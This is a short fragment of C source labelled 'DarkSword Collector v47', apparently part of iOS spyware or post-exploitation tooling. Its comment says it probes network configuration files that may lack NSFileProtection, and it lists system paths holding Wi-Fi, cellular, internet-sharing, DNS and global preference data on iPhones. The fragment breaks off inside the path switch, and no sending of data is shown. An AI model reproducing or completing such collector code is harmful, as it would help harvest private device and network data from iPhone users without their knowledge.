/**
 * DarkSword Collector v47 - Network info scan
 * Try to read network config files that might not be NSFileProtection protected
 */
...
static const char *get_path(int id) {
    switch (id) {
        case 0: return "/etc/resolv.conf";
        case 1: return "/var/run/resolv.conf";
        case 2: return "/Library/Preferences/SystemConfiguration/preferences.plist";
        case 3: return "/var/mobile/Library/Preferences/com.apple.commcenter.plist";
        case 4: return "/var/mobile/Library/Preferences/com.apple.wifi.plist";
        case 5: return "/var/mobile/Library/Preferences/com.apple.mobileinternetsharing.plist";
        case 6: return "/etc/hosts";
        case 7: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
